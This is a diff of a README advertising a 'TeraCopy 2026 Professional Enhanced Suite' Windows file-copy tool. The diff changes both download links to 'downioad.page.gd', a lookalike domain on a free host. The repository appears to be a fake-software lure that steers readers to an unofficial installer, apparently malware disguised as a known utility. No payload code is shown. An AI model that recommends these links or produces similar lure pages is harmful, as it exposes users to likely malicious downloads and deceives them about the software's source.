@@ -2,7 +2,7 @@
 
 TeraCopy 2026 Professional Enhanced Suite is a robust file copying utility designed for Windows desktops. It offers advanced features to ensure reliable and efficient data transfers, making it an essential tool for anyone who frequently moves large files or needs to verify data integrity.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -65,7 +65,7 @@ This repository was last updated in 2026, ensuring compatibility with the latest
 
 ## Download
 
-For the latest version, visit: [Download TeraCopy 2026](https://download-page.page.gd/)
+For the latest version, visit: [Download TeraCopy 2026](https://downioad.page.gd/)
 
 ---
 
